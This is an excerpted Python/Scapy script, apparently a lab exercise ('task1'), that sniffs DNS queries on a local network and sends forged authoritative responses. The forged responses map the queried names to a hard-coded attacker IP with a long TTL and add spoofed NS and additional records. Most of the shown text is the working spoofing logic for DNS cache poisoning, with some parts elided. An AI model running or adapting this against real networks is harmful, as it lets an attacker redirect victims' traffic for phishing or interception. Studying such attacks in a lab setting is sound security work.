## Python script that can be used to sniff and send spoofed DNS response to local servers
## within the LAN
...
def usage():
	print(" Usage: ./task1 <interface> <Target DNS server srcIP>")
	print(" e.g. ./task1 eth0 10.0.0.1")


def main():
	osCheck()

	attackerIP = '192.168.19.136'
	...
	while 1:
		...
		if ( getDNSPacket[0].haslayer(DNS) ) and ( getDNSPacket[0].getlayer(IP).src == argv[2].strip()) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
			...
			spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=0,aa=1,rd=1,ra=1,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=attackerIP,ttl=259200),ns=DNSRR(rrname=clientDNSQuery.strip('www.'),type='NS',ttl=259200,rdata=clientDNSQuery.replace('www','ns')),ar=DNSRR(rrname=clientDNSQuery.replace('www','ns'),type='A',ttl=259200,rdata=clientDNSServer))
						
			# Now that we have built our packet, let's go ahead and send it on its merry way.
			print(' \n Sending spoofed response packet ')
			send(spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=argv[1].strip(), count=1)
			print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(clientDNSServer, 53, clientSrcPort ))
